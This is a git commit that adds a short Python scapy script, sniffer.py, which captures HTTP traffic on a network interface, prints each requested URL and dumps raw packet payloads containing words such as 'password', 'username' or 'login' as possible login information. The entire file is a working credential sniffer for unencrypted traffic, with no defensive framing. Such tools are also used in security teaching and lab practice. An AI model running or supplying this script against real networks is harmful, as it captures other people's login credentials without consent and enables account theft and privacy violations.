d5e2c848531e2080a167a6b5d02fd637c02fb1d5
Devi Prasad <dp.devi03@gmail.com>
2019-01-31 01:07:45 +0530

    Add files via upload

---
+++ sniffer.py
@@ -0,0 +1,44 @@
+import scapy.all as scapy
+from scapy.layers import http
+
+
+def getURL(packets):
+    return packets[http.HTTPRequest].Host + packets[http.HTTPRequest].Path
+
+
+def get_LoginInfo(packets):
+    if packets.haslayer(scapy.Raw):
+
+        load = packets[scapy.Raw].load
+        keywords = ["password", "username", "user", "login", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
+def process_sniffed_packets(packets):
+
+    if packets.haslayer(http.HTTPRequest):
+
+        url = getURL(packets)
+        print "Http Request : \n\n"+url
+
+        login_info = get_LoginInfo(packets)
+        if login_info:
+            print "Possible Login Info : \n\n"+login_info
+
+
+def sniff(interface):
+
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)
+
+
+
+def main():
+
+    sniff("eth0")
+
+
+
+if __name__ == '__main__':
+    main()
